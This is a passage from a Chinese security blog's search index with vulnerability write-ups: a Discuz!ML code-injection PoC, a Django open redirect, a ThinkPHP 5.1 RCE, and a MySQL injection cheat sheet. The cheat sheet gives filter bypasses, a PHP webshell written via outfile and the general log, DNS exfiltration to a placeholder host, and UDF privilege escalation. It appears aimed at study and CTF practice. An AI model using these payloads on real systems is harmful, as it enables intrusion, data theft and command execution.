<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Discuz!ML V3.X 代码注入复现与原理分析]]></title>
    <url>%2F2019%2F07%2F15%2FDiscuz!ML%20V3.X%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[poc12345678910GET /Discuz/upload/forum.php HTTP/1.1Host: 169.254.183.180User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: lpAo_2132_saltkey=gJ6FRwO6; lpAo_2132_language=en&apos;.phpinfo().&apos;; lpAo_2132_lastvisit=1563156484; lpAo_2132_sid=G5YO6z; lpAo_2132_lastact=1563160086%09home.php%09misc; lpAo_2132_onlineusernum=1; lpAo_2132_sendmail=1Upgrade-Insecure-Requests: 1Cache-Control: max-age=0 漏洞描述Discuz 系列建站软件（以下简称DZ）是目前国内部署最为广泛的建站系统，经过多年的发展，已成为集CMS、Forum、Blog等功能为一体的社区系统，并具备完善的插件和模板机制，使得针对DZ进行二次开发变得非常有效率。 由于Discuz!ML V3.X 的cookie字段中language参数未经过过滤，被拼接后直接写入缓存中，随后缓存又被加载导致了任意代码执行。 受影响的系统版本12345Discuz! ML v.3.4Discuz! ML v.3.3Discuz! ML v.3.2 漏洞分析在debug模式下Poc中扔入过长代码执行会报错.根据debug报错信息进行溯源。 以 forum.php 为例，进入模块通常会首先加载内核代码，通过加载 class_core.php 即可，参考源码：require &#39;./source/class/class_core.php&#39;; 内核代码加载完成后，接着加载对应模块的代码，包括对应的函数库、相关类库等等；比如 forum 模块就会加载： 参考源码：require &#39;./source/function/function_forum.php&#39;; Dz 每个大模块都是有很多子模块构成，访问或者调用这些子模块通常都是通过 URL 传参数来实现，比如：论坛版块（Forum）可以有论坛版块展示或者帖子内容展示等不同的操作，论坛版块展示则通过加载 forumdisplay 模块来实现，参考源码：require DISCUZ_ROOT.&#39;./source/module/forum/forum_&#39;.$mod.&#39;.php&#39;; 其中 $mod 的值就是 forumdisplay，而如果当前操作是帖子内容展示，则 $mod 的值为 viewthread。 Discuz 调用实例：1、”http://www.bacysoft.cn/forum.php?mod=viewthread&amp;tid=57“ 123入口文件：forum.php， /forum.php模块文件：viewthread，/source/module/forum/forum_viewthread.php其他参数：tid， 帖子ID号 我们进入forum.php line:76 由于我们并没有加载子模块所以默认$mod为index，forum.php line:49 进入forum_index.php line:432,被污染的php缓存文件就是从这里被加载进来的 其中$cachefile因为未对DISCUZ_LANG变量进行过滤为我们可控变量 全局搜索DISCUZ_LANG，可以发现在discuz_application.php line:341时对其进行定义 可以看到在同文件下discuz_application.php line:305对$lng进行赋值，这里可以清楚看到其中并未对var[&#39;cookie&#39;][&#39;language&#39;]进行任何过滤，这也是该漏洞形成的根本原因 回到function_core.php文件，进入function_core.php line:653 在经过了一轮的替换 最后在class_template.php line:105中将缓存写入文件，进行包含，这时该缓存文件并没有被我们污染 但在该缓存文件line:1,进行了再次包含 最终包含了包括该缓存文件共五个文件 其中问题出在en&#39;.phpinfo().&#39;_1_1_common_header_forum_index.tpl.php文件 可以看到在class_template.php line:30时，将template\default\common\footer.htm文件对$template变量进行赋值 由于footer.htm中 {subtemplate分别在line:1 line:140 line:200 多次出现，导致在，class_template.phpline line:46 时进行回调函数时候对$this-&gt;subtemplates进行赋值 导致对$headeradd进行赋值，由于$cachefile为可控变量，所以$headeradd也为我们可控的 可以看到同样在该文件中，class_template.phpline line:84 将$headeradd变量写入缓存中 这时只要$cachefile里面包含类似&#39;.phpinfo().&#39;就可以将危险的函数嵌入到缓存文件中 最后因为缓存文件被包含导致我们的写入的危险函数被执行导致我们可以做到任意代码执行的效果 参考Discuz!ML V3.X 代码注入分析 Discuz ML! V3.X 代码注入漏洞深度分析 Discuz 整体架构及内核浅析一：调用流程（For DzX3.2） Discuz ML! V3.X 代码注入漏洞深度分析]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django URL跳转漏洞（CVE-2018-14574 ）分析与复现]]></title>
    <url>%2F2019%2F07%2F10%2FDjango%20URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%20%EF%BC%89%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞分析1当setting中配置了django.middleware.common.CommonMiddleware且APPEND_SLASH为True时漏洞就会触发，而这两个配置时默认存在的. Django处理一个 Request 的过程是首先通过中间件，然后再通过默认的 URL 方式进行的。我们可以在 Middleware 这个地方把所有Request 拦截住，用我们自己的方式完成处理以后直接返回 Response。 在django项目的settings模块中，有一个 MIDDLEWARE_CLASSES 变量，其中每一个元素就是一个中间件 you_project.settings.py 42 在请求阶段，调用视图之前，Django会按照MIDDLEWARE_CLASSES中定义的顺序自顶向下应用中间件 Django处理request的流程大致为 12345678910111213141.用户通过浏览器请求一个页面2.请求到达Request Middlewares，中间件对request做一些预处理或者直接response请求3.URLConf通过urls.py文件和请求的URL找到相应的View4.View Middlewares被访问，它同样可以对request做一些处理或者直接返回response5.调用View中的函数6.View中的方法可以选择性的通过Models访问底层的数据7.所有的Model-to-DB的交互都是通过manager完成的8.如果需要，Views可以使用一个特殊的Context9.Context被传给Template用来生成页面a.Template使用Filters和Tags去渲染输出b.输出被返回到Viewc.HTTPResponse被发送到Response Middlewaresd.任何Response Middlewares都可以丰富response或者返回一个完全不同的responsee.Response返回到浏览器，呈现给用户 1上述流程中最主要的几个部分分别是：Middleware(中间件，包括request, view, exception, response)，URLConf(url映射关系)，Template(模板系统) Django中，Middleware可以渗入处理流程的四个阶段：request，view，response和exception 相应的，在每个Middleware类中都有process_request，process_view， process_response 和 process_exception这四个方法。 Middleware是在Django BaseHandler的load_middleware方法执行时加载的，加载之后会建立四个列表作为处理器的实例变量 其中在请求阶段，调用视图之前，Django会按照MIDDLEWARE_CLASSES中定义的顺序自顶向下应用中间件。会用到两个钩子：process_request();process_view(); 其中CommonMiddleware是Django中一个通用中间件，实质上是一个类，位于site-packages/django/middleware/common.py，会执行一些HTTP请求的基础操作 当我们发起类似http://127.0.0.1:8000//www.baidu.com的请求，会先进入site-packages/django/middleware/common.py 42，中process_request()钩子 当url进入site-packages/django/middleware/common.py 60 进入should_redirect_with_slash函数先判断url是否需要 site-packages/django/middleware/common.py 70 如果url不全时，进入get_full_path函数site-packages/django/middleware/common.py 61 进入get_full_path_with_slash函数 可以看到通过new_path = request.get_full_path(force_append_slash=True)获取了新的path,且force_append_slash为True 进入get_full_path函数 site-packages/django/http/request.py 115 可以看到由于force_append_slash=True对Path进行补全并返回新的path,//baidu.com/ 进入response_redirect_class函数,它是HTTP跳转的一个基类 以//开头的外部URL将由浏览器翻译为协议、绝对URL site-packages/django/http/response.py 427 site-packages/django/http/response.py 402 可以看到产生了正常的301跳转 复现环境搭建 12345pip install django==2.0.7django-admin startproject projectpython manage.py runserver 或者使用P牛的VulhubCVE-2018-14574 访问127.0.0.1//www.baidu.com即可跳转到百度页面 修复在commend.py中的get_full_path_with_slash函数后新增了escape_leading_slashes函数对\\进行过滤 参考Django架构流程分析 Django URL跳转漏洞分析（CVE-2018-14574 ） Fixed CVE-2018-14574]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Python框架</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThinkPHP5.1.x RCE分析]]></title>
    <url>%2F2019%2F07%2F06%2FThinkPHP5.1.x%20RCE%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[修复造成这个漏洞的主要原因为1.以反斜线\开始时直接将其作为类的命名空间路径。2.thinkphp命名空间自动加载类的特性。官方采的修复方式修复：对控制器的命名规则进行正则检测： thinkphp/library/think/route/dispatch/Url.php 63行 123 if ($controller &amp;&amp; !preg_match(&apos;/^[A-Za-z][\w|\.]*$/&apos;, $controller)) &#123; throw new HttpException(404, &apos;controller not exists:&apos; . $controller);&#125; 漏洞和分析环境搭建 1php.exe composer.phar create-project topthink/think=5.1.20 tp --prefer-dist POC 1http://127.0.0.1/tp5.1.20/public/index.php?s=index/think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 1http://127.0.0.1/tp5.1.20/public/index.php?s=index/think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 thinkphp/library/think/APP.php 402 路由检测 F7进入 routeCheck() thinkphp/library/think/APP.php 598 获取应用调度信息 进入path() thinkphp/library/think/Request.php 716 在没有定义路由的情况下典型的URL访问规则（PATHINFO模式）是：http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...] 进入pathinfo() thinkphp/library/think/Request.php 680 根据不同的请求方式获取当前URL的pathinfo信息 thinkphp/library/think/APP.php 604 对路由进行解析,返回一个dispatch对象 thinkphp/library/think/route/dispath/URL.php 23 解析默认的URL规则 进入parseUrl() thinkphp/library/think/route/dispath/URL.php 48 进入parseUrlPath() thinkphp/library/think/route/rule.php 960 对path进行/分割，分割成模块/控制器/操作方法 进入init() thinkphp/library/think/route/dispatch/Module.php 37 多模块部署 满足该模块不是deny模块，且存在这个模块(index)，则将$available = true; thinkphp/library/think/route/dispatch/Module.php 58 模块初始化 thinkphp/library/think/APP.php 406 对路由进行调度 thinkphp/library/think/APP.php 431 thinkphp/library/think/APP.php 431 进入add(),注册中间件 thinkphp/library/think/APP.php 435 调度中间件 进入dispath() 进入resolve() 就会调用之前App类中的闭包函数。这里会调用Dispatch类中的run()方法 thinkphp/library/think/route 168 进入 exec() thinkphp/library/route/dispatch 92 实例化控制类即\think\container 进入controller() 进入parseModuleAndClass() 这里一旦控制器是以\开头则会直接将其作为类的命名空间路径，这也是导致这个漏洞的主要原因 接着就会判断其是否存在并加载这个类，也就是container 进入make() thinkphp/library/think/container.php 278 进入invokeFunction() 进行反射实例化 在thinkphp/library/think/route/dispatch/Module.php 132 利用反射机制调用类方法，从而进行代码执行 最终调用了thinkphp/library/think/Container.php，call_user_func_array()执行任意函数调用]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>PHP框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql注入小结]]></title>
    <url>%2F2019%2F05%2F30%2Fmysql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[sql注入原理小结在owasp发布的top 10漏洞里面，注入漏洞一直是危害排名第一，其中数据库注入漏洞是危害最大也是最受关注的漏洞。 当攻击者发送的sql语句被sql解释器执行，通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄露。 原理主要参考SQL和NoSQL注入原理剖析（上）感觉写的挺好的，借花献佛一波。 Sql注入主流的修复方案也很简单，过滤特殊字符、转义特殊字符、预处理等等。哪个方案更好更合理，是否应该全局处理，通过AOP、装饰还是数据库操作基类处理。 在日常执行mysql语句的过程中,都是客户端进程向服务器进程发送一段文本(MySQL语句),服务器进程处理后再向客户端进程发送一段文本(处理结果).sql语句从客户端到数据库服务经过了以下步骤 客户端应用 =&gt; 客户端驱动 =&gt; 数据库客户端/服务器协议 =&gt; 数据库服务器 Mysql客户端/服务端协议MySQL协议设计十分简单在通讯的过程中，SQL语句就是一个普通明文字符串。 12345678910111213main() |-sql_connect() | |-sql_real_connect() | |-mysql_init() # 调用MySQL初始化 | |-mysql_options() # 设置链接选项 | |-mysql_real_connect() # sql-common/client.c | |-connect_sync_or_async() # 通过该函数尝试链接 | | |-my_connect() # 实际通过该函数建立链接 | |-cli_safe_read() # 等待第一个handshake包 | |-run_plugin_auth() # 通过插件实现认证 | |-put_info() # 打印客户端的欢迎信息 |-read_and_execute() # 开始等待输入、执行SQL 服务器协议实现MySQL服务器接收到请求后会为它分配线程，然后扔给sql_parse中的do_command()方法处理指令，do_command()中尝试解析数据包并装配指令： 在如下列举客户端与服务端的详细交互过程. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657### Client(mysql) ### ### Server(mysqld) ###---------------------------------------- --------------------------------------------------main() mysqld_main() |-sql_connect() |-init_ssl() | |-sql_real_connect() &#123;for(;;)&#125; |-network_init() | |-mysql_init() |-handle_connections_sockets() | |-init_connection_options() |-select()/poll() | |-mysql_real_connect() | | |-cli_mysql_real_connect() | | |-socket() | | |-vio_new() | | |-vio_socket_connect() | | | |-mysql_socket_connect() | | | |-connect() | | | | | | | | [Socket Connect] | | | |&gt;&gt;==========&gt;&gt;==========&gt;&gt;======&gt;&gt;| | | |-accept() | |-vio_keepalive() |-vio_new() | |-my_net_set_read_timeout() |-my_net_init() | |-my_net_set_write_timeout() |-create_new_thread() | |-vio_io_wait() |-handle_one_connection() &#123;新线程&#125; | | |-thd_prepare_connection() &#123;for(;;)&#125; | | | |-login_connection() | | | |-check_connection() | | | |-acl_check_host() | | | |-vio_keepalive() | | | |-acl_authenticate() | | | |-do_auth_once() | | | | |-native_password_authenticate() &#123;插件实现&#125; | | | | |-create_random_string() | | | | |-send_server_handshake_packet() | | | | | | | [Handshake Initialization] | | | | |&lt;&lt;==&lt;&lt;==========&lt;&lt;==========&lt;&lt;==========&lt;&lt;==========&lt;&lt;| | |-cli_safe_read() | | |-my_net_read() | |-run_plugin_auth() | | | | | |-native_password_auth_client() | | | | | |-scramble() | | | | | |-my_net_write() | | | | | | | | | | | | [Client Authentication] | | | | | |&gt;&gt;==========&gt;&gt;==========&gt;&gt;==========&gt;&gt;========&gt;&gt;| | | | | |-check_scramble() | | | |-mysql_change_db() | | | |-my_ok() | | [OK] | | | |&lt;&lt;==========&lt;&lt;==========&lt;&lt;==========&lt;&lt;==========&lt;&lt;| | |-cli_safe_read() | | | | | | | | | |-put_info() &#123;Welcome Info&#125; | |-read_and_execute() [for(;;)] | |-thd_is_connection_alive() [while()] |-do_command() 做完这些之后，转由dispatch_command()处理SQL语句： 1.移除SQL语句头尾空白字符（源代码中注释的是”remove garbage”）和尾部分号 2.分配剩余长度加1的空间装填SQL语句，并在末尾填充字符作为结束标识 3.调用mysql_parse()进入SQL语句的解析阶段 至此，SQL语句仅仅被简单的做了去除头尾多余字符的处理。 服务器解析执行实现mysql_parse()解析SQL语句（MySQL主要使用Lex词法分析器和Yacc语法分析器对SQL语句进行解析） mysql_execute_command()根据解析得到的sql_command选择动作 execute_sqlcom_select()执行SQL语句并得到执行结果 这里才会对SQL语句结构化和语义化（再次提醒一下，以上所有流程都是以最开始那条查询语句为场景的，其他类型语句可能会执行另外的流程）。 （这张图我觉得很好，就拿来解释了。 客户端协议实现（Driver层）MySQL在Github上开源了C++、Java、.NET、Python、NodeJS，以及ODBC几个版本的官方driver.对于普通的SQL查询语句，该阶段几乎不会进行过多额外的处理。 SQL解析顺序SQL解析顺序: 例子 1234567891011121314SELECT DISTINCT &lt; select_list &gt;FROM &lt; left_table &gt; &lt; join_type &gt;JOIN &lt; right_table &gt; ON &lt; join_condition &gt;WHERE &lt; where_condition &gt;GROUP BY &lt; group_by_list &gt;HAVING &lt; having_condition &gt;ORDER BY &lt; order_by_condition &gt;LIMIT &lt; limit_number &gt; 然而它的执行顺序是这样的 123456789101 FROM &lt;left_table&gt; 2 ON &lt;join_condition&gt; 3 &lt;join_type&gt; JOIN &lt;right_table&gt; 4 WHERE &lt;where_condition&gt; 5 GROUP BY &lt;group_by_list&gt; 6 HAVING &lt;having_condition&gt; 7 SELECT 8 DISTINCT &lt;select_list&gt; 9 ORDER BY &lt;order_by_condition&gt;10 LIMIT &lt;limit_number&gt; 比如说我们sql union注入时候，多出来的语句应该就会拼接到其中而导致了sql注入的实现。 Sql注入原理小结所以之所以导致sql注入的原因主要为为：1.在客户端driver层没有对sql语句进行过滤.2.在客户端与服务端交互时为明文传输也并未做任何过滤。3.在服务端处理sql语句的时候仅仅只是对sql语句进行去掉首位空格以及;符号等。 所以导致一旦我们能够控制sql语句就导致了sql注入漏洞形成。 sql注入绕过小结注入点判断过滤了information,即已知表名求列名1select e.1 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)f,(select 5)g union select * from rois_flag)e; 盲注 1select if(substr((select e.1 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)f,(select 5)g union select * from rois_flag)e limit 1,1),1,1)=2,sleep(1),sleep(5)); 过滤了空格1.%20 %09 %0a %0b %0c %0d %a0 /**/ tab,%a0 这个不会被php的\s进行匹配 1select/**/sid/**/from/**/rois_flag/**/where/**/sid/**/=/**/0/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&apos;rois_flag&apos;; 2.通过反引号,括号进行拼接 1select sid from rois_flag where sid = &apos;50&apos;union(select`column_name`from`information_schema`.`columns`where`table_name`=&apos;rois_flag&apos;); 如果要多个column_name 却不要逗号与空格 1select sid,flag from rois_flag where sid = &apos;0&apos;union(select*from((select`column_name`from`information_schema`.`columns`where`table_name`=&apos;rois_flag&apos;)`a`join(select`column_name`from`information_schema`.`columns`where`table_name`=&apos;rois_flag&apos;)b)); 过滤逗号12345limit 0,1 =&gt; limit 1 offset 0;mid(str,5,1) =&gt;mid(&apos;str&apos;from 5 for 1) =&gt;substr(&apos;str&apos; from for 1)union select 1,2,3 =&gt; union select * from (select 1)a join (select 2)b join (select 3)c; 比较运算符like rlike &gt; &lt; = regexp in between 1.in() 1select * from users where id in(2); 2.like 1select * from users where id like 2; 3.between 1select * from users where username between &apos;Duma&apos; and &apos;Dumz&apos;; 4.like(模糊匹配) 1select &apos;12345&apos; like &apos;12%&apos; =&gt; true 5.regexp 或 rlike(正则匹配) 1select &apos;123455&apos; regexp &apos;^12&apos; =&gt; true 单引号过滤1.十六进制编码 2.select username from users where id = 0 union select password from users where username = char(65,66,67); if过滤1.find_in_set相同为1 1select * from users where id = 1 and find_in_set(53,ord(substr(version()from(1)for(1)))); 2.strcmp相同为0 1select * from users where id = 1 and strcmp(53,ord(substr(version()from(1)for(1)))); 3.select case when (条件) then 代码1 else 代码 2 end 1select * from users where id = 1 &amp;&amp; (select case when ord(substr(version()from(1)for(1)))=53 then sleep(1) else sleep(5) end); and/or过滤1.连等绕过 1select username from users where 1=1=1=(select 1); 1select username from users where id = 1 &amp;&amp; (select if(1=1,sleep(1),sleep(5))); 2.直接使用语句 1select username from users where id = 1 &amp;&amp; if(1=1,sleep(1),sleep(5)); 3.异或 1select * from users where id = 0^(ascii(substr((select version()),1,1))&gt;127)^1; select过滤过滤了select关键词，我觉得正常情况下只有通过大小写绕过，双写绕过等方式进行绕过，如果是ctf题目中如果实在不行只能使用mysql中本来就有的函数更具题意思进行注入。 比如：一个有趣的 SQL 注入小系列 当存在两个以上sql查询时候可以通过这样形式进行绕过，这个时间是当前时间靠后一点，当刚刚实行的时候是小于这个时间，执行一会就会大于这个时间就会导致sql语句查询不同。 1select username from users where id =1||current_time&gt;1000000; 这里还考虑了可以手动产生变化 1id=case when @hs is null then @hs:=2 else 1 end%23 盲注截取替换left(), right(), substring(), substring_index()，mid(), substr(),lpad();rpad();instr();locate(s1,s) ,position 逗号过滤 1select substr((version()),1,1); 1select substr(version()from(1)for(1)); for过滤 1select substring(&apos;admin&apos; from 5); 123456+---------------------------+| substring(&apos;admin&apos; from 5) |+---------------------------+| n |+---------------------------+1 row in set (0.00 sec) 1select substring(&apos;admin&apos; from 4); 123456+---------------------------+| substring(&apos;admin&apos; from 4) |+---------------------------+| in |+---------------------------+1 row in set (0.00 sec) 盲注时延替换sleep(5)，benchmark(1000000,md5(1))，笛卡尔积从而让查询时间变长 笛卡尔积从而让查询时间变长 select count(*) from information_schema.columns; 123456+----------+| count(*) |+----------+| 829 |+----------+1 row in set (0.08 sec) select count(*) from information_schema.columns, information_schema.columns T2;select count(*) from information_schema.columns, information_schema.columns T2,information_schema.columns T3; 123456+-----------+| count(*) |+-----------+| 569722789 |+-----------+1 row in set (14.84 sec) 盲注之中的运用 1select username from users where id = 1 union select if(1=1,(select count(*) from information_schema.columns, information_schema.columns T2,information_schema.columns T3),sleep(2)); 假如说 or 被过滤了呢？ 移位盲注盲注使用移位的方法我感觉效率会高挺多的。 一共有八位 2**8 每位共有两种情况0，1 select ascii(b&#39;01110010&#39;); 123456+--------------------+| ascii(b&apos;01110010&apos;) |+--------------------+| 114 |+--------------------+1 row in set (0.00 sec) select ascii(b&#39;01110010&#39;) &gt;&gt; 1; 123456+-------------------------+| ascii(b&apos;01110010&apos;) &gt;&gt; 1 |+-------------------------+| 57 |+-------------------------+1 row in set (0.00 sec) 如下select if ((ascii((substr(user(),1,1))) &gt;&gt; 7 )=0,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);select if ((ascii((substr(user(),1,1))) &gt;&gt; 6 )=0,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);select if ((ascii((substr(user(),1,1))) &gt;&gt; 5 )=2,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);select if ((ascii((substr(user(),1,1))) &gt;&gt; 4 )=6,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;); 布尔盲注 限制union select 1select * from users where username = &apos;Dumb&apos; &amp;&amp; password&lt;&apos;e&apos;; 123456+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec) 1select * from users where username = &apos;Dumb&apos; &amp;&amp; password&lt;&apos;a&apos;; 1Empty set (0.00 sec) 2.通过order by 1select * from users where username = &apos;Dumb&apos; union select 1,&apos;a&apos;,3 order by username ; 123456+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | a | 3 || 1 | Dumb | Dumb |+----+----------+----------+ 1select * from users where username = &apos;Dumb&apos; union select 1,&apos;e&apos;,3 order by username ; 123456+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb || 1 | e | 3 |+----+----------+----------+ 报错注入1.已知表名，报出列名 1select * from (select * from users as a join users as b)as c; ERROR 1060 (42S21): Duplicate column name &#39;id&#39; 1select * from (select * from users as a join users as b using(id))as c; ERROR 1060 (42S21): Duplicate column name &#39;username&#39; 2.爆破列名 1select * from users where username=&apos;admin&apos; and polygon(id); 当为已存在列名时候会 1ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsing 不存在时候 1select * from users where username=&apos;admin&apos; and polygon(a); 1ERROR 1054 (42S22): Unknown column &apos;a&apos; in &apos;where clause&apos; 杂CAST1UPDATE table SET views = &apos;1&apos; WHERE id = -2441 OR (ORD(MID((SELECT IFNULL(CAST(FirstName AS CHAR),0x20) FROM nowamagic.`tb2` ORDER BY id LIMIT 1,1),2,1))&gt;112)# procedure analyse()1select * from users where id = 0^(ascii(substr((select version()),1,1))&gt;127)^1; 特殊字符1.函数名和括号直接可以插入特殊字符 ex 1concat/**/() 1information_schema%0a.%0aTABLES 2.{} select {x username} from {x users} limit 1; 常用的 Mysql 内置变量123456789version() 当前数据库详细版本号database() 当前所在的数据库user() 当前数据库用户权限@@datadir 数据文件的存放目录@@basedir 数据库的安装路径@@version_compile_os 宿主系统平台@@hostname 当前机器的机器名null 特殊工具,因为它可以匹配任意数据类型,在遍历字段个数时可能会用到show variables like &apos;log_%&apos;; 查看日志文件存放位置,我们可以通过这个来拿webshell mysql root密码select host,user,password from mysql.user; 1234567+-----------+------+-------------------------------------------+| host | user | password |+-----------+------+-------------------------------------------+| localhost | root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 || 127.0.0.1 | root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 || ::1 | root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |+-----------+------+-------------------------------------------+ 修改MySQL密码法一.1.use mysql; 2.update user set password=password(&quot;123&quot;) where user=&quot;root&quot;; 3.flush privileges;（刷新权限） 法二.mysqladmin -u用户名 -p旧密码 password 新密码 指定可外连的数据库用户和 ip感觉实际用途很小mysql&gt; grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;admin&#39; with grant option; mysql&gt; flush privileges; mysql 注释方法1234567# 最普通的单行注释,实际渗透中最好用之前用url编码下,效果会更好,编码后的值为 %23-- - 注意中间的空格哦-- + `` 在bypass一些比较老的waf可能还会有些用/**/ 常规内联注释/*!*//*!50000 */ mysql 5通用,带版本内联注释 mysql写shell11.outfile 需要权限 123select * into outfileselect * into dumpfilemysql&gt; select &apos;0x3c3f7068702024736c203d206372*******&apos; into outfile &apos;/var/www/html/hell.php&apos;; mysql 的 log 功能写 shell 需要权限,当你把这个开关开启以后（默认off）,它自动把所有执行过的 sql 语句都记录到一个指定的文件里去,并且shell对你当前数据库服务用户一定要是可写的。 1mysql&gt; show variables like &apos;%general%&apos;; ; 1234567+------------------+--------------------------------------------------------+| Variable_name | Value |+------------------+--------------------------------------------------------+| general_log | OFF || general_log_file | C:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-HCNI0KI.log |+------------------+--------------------------------------------------------+2 rows in set (0.00 sec) 1set global general_log_file = &apos;/var/www/shell.php&apos;; 1select &apos;&lt;?php @eval($_POST[shell])?&gt;&apos;&apos;; 改回来 1set global general_log_file = &apos;/var/run/mysqld/mysqld.log&apos;; 1set global general_log = off; mysql执行命令MySQL 5.x中增加了system命令，可以直接执行系统命令。1.system whoami; MySQL Out-of-Band 攻击MySQL中存在一个全局系统变量secure_file_priv。这个变量用来限制数据导入和导出操作的影响，例如由LOAD DATA 和SELECT…INTO OUTFILE语句和LOAD_FILE()函数执行的行为。 ySQL 5.5.34版本中，默认值为空，也就是说我们能够使用这些函数。 在MySQL 5.6.34版本中，这个值默认是NULL，它会禁用导入和导出操作。 1select @@secure_file_priv; 123456+--------------------+| @@secure_file_priv |+--------------------+| NULL |+--------------------+1 row in set (0.00 sec) 在MySQL中，我们可以使用DNS解析。 select load_file(concat(&#39;\\&#39;,version(),&#39;.hacker.site\a.txt&#39;)); 在自己DNS服务器就可以看到数据了。 实际这个感觉用处不大，主要用作没有回显时候提取数据。 mysql提权UDF提权直接sqlmap -d 就好了 1sqlmap -d &quot;mysql://root:Hehe123456@192.168.192.120:3306/test&quot; --os-shell [1]dbms:代表所使用的数据库，如我们这里是mysql [2]user:对应我们数据库的用户，如我们这里是root [3]password:对应我们数据的密码，如我的服务器为Hehe123456 [4]dbma_IP:数据库服务器对应的ip地址，如我这里为192.168.192.120 [5]dbms_PORT:数据服务器所使用的端口 [6]database_NAME:你要使用的数据库名 sqlmap\udf\mysql\windows\32目录下存放着lib_mysqludf_sys.dll 原理： udf = ‘user defined function’，即‘用户自定义函数’。是通过添加新函数，对MYSQL的功能进行扩充，性质就象使用本地MYSQL函数如abs()或concat()。UDF是MySQL的一个共享库，通过udf创建能够执行系统命令的函数sys_exec、sys_eval，使得入侵者能够获得一般情况下无法获得的shell执行权限 步骤1.将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下） 这步可以靠shell，或者SELECT hex(load_file(0x433a5c787878785c7878782e646c6c)) into dumpfile &#39;xxx&#39;; 然后通过各种方法把utf文件内容写进这个文件里 2.从udf文件中引入自定义函数(user defined function) CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’; 只有两个变量，一个是function_name（函数名），我们想引入的函数是sys_eval。还有一个变量是shared_library_name（共享包名称），即‘udf.dll’。 3.执行自定义函数 至此我们已经引入了sys_eval函数，下面就是使用了。这个函数用于执行系统命令，用法如下： 1select sys_eval(&apos;cmd command&apos;); LINUX: 1show variables like &apos;%plugin%&apos;; 1234567+-------------------------------+------------------------+| Variable_name | Value |+-------------------------------+------------------------+| default_authentication_plugin | mysql_native_password || plugin_dir | /usr/lib/mysql/plugin/ |+-------------------------------+------------------------+2 rows in set (0.00 sec) 1select unhex(&apos;省略&apos;) into dumpfile &apos;/usr/lib64/mysql/plugin/mysqludf.so&apos;; 1create function sys_eval returns string soname &apos;mysqludf.so&apos;; 1select sys_eval(&apos;whoami&apos;); 限制条件： 1）mysql root账号弱口令 2）mysql启动账户需要有插件目录的写入权限，例如yum安装的mysql Windows： sql注入修复小结waf参考SQL注入防御与绕过的几种姿势 SQL注入之骚姿势小记 MySQL数据库Root权限MOF方法提权研究 SQL注入ByPass的一些小技巧 https://cloud.tencent.com/developer/article/1196791 SQL和NoSQL注入原理剖析（上） Mysql服务器处理客户端请求流程 深入理解MySQL核心技术 SQL注入测试技巧TIP：再从Mysql注入绕过过滤说起 步步深入：MySQL架构总览-&gt;查询执行流程-&gt;SQL解析顺序 深入了解SQL注入绕过waf和过滤机制 Bypass WAF Cookbook SQL注入速查表（下）与Oracle注入速查表 Mysql注入基础知识汇总 一个有趣的 SQL 注入小系列 SQL注入wiki 基于时间的高效的SQL盲注-使用MySQL的位运算符 遭遇一次MySQL猜解注入攻击 史上最水的MYSQL注入总结 Mysql 专辑 MySQL Out-of-Band 攻击（含演示视频） Mysql udf提权(Linux平台) SQL注入关联分析]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码加密原理探索]]></title>
    <url>%2F2019%2F05%2F15%2FPHP%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E6%8E%A2%E7%B4%A2%2F</url>
